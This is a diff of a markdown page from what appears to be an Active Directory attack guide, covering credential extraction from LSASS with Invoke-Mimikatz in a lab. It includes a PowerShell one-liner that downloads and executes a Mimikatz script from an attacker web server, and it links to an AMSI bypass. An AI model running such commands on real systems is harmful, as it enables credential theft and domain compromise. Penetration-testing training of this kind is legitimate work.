@@ -8,7 +8,7 @@ render_with_liquid: false
 description: Designed to provide a comprehensive guide to Active Directory (AD) attack techniques
 ---
 
-# 5. Extract Credentials from LSASS (Invoke Mimikatz)
+### 5. Extract Credentials from LSASS (Invoke Mimikatz)
 
 Once we have remote admin session on the remote machine, we will extract credentials from LSASS. Bear in mind , **to avoid LSASS unless you have nothing to do.**
 
@@ -22,10 +22,8 @@ Invoke-Command -ScriptBlock {$env:username;$env:computername}    -ComputerName d
 
 Now, let’s use Invoke-Mimi to dump hashes on dcorp-mgmt to grab hashes of the domain admin. This script is to downloads and executes the Invoke-Mimi.ps1 that is hosted in my web server.
 
-```jsx
----
+```bash
  iex (iwr http://172.16.100.X/Invoke-Mimi.ps1 -UseBasicParsing)
----
 ```
 
 Then, we need to bypass the AMSI using our [script](https://beardenx.github.io/posts/Bypass-AMSI-Like-a-King/). OR
